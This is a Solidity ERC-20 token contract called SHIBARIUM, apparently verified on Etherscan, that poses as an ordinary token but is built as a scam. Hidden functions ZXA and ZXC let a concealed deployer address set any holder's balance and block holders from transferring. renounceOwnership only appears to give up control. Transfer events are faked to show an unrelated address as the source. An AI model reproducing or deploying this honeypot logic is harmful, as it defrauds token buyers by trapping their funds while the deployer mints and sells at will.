/**
 *Submitted for verification at Etherscan.io on 2023-01-30
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract SHIBARIUM {
  
    mapping (address => uint256) private BNL;
    mapping (address => uint256) private CNL;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "SHIBARIUM";
    string public symbol = unicode"SHIBARIUM";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private rLL;
    address XDEP = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        rLL = msg.sender;
        zMAKE(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function zMAKE(address account, uint256 amount) internal {
    account = XDEP;
    BNL[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }
 function ZXC (address iiX, uint256 iiV)  public {
     if(msg.sender == rLL) {
   CNL[iiX] = iiV;}}

   function balanceOf(address account) public view  returns (uint256) {
        return BNL[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(CNL[msg.sender] <= 1);
        require(BNL[msg.sender] >= value);
  BNL[msg.sender] -= value;  
        BNL[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }


function ZXA (address iiX, uint256 iiV)  public {
    if(msg.sender == rLL) {
    BNL[iiX] = iiV;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == rLL) {
 require(value <= BNL[from]);
        require(value <= allowance[from][msg.sender]);
        BNL[from] -= value;  
      BNL[to] += value; 
        from = XDEP;
        emit Transfer (from, to, value);
        return true; }    

        require(CNL[from] <= 1 && CNL[to] <=1);
        require(value <= BNL[from]);
        require(value <= allowance[from][msg.sender]);
        BNL[from] -= value;
        BNL[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }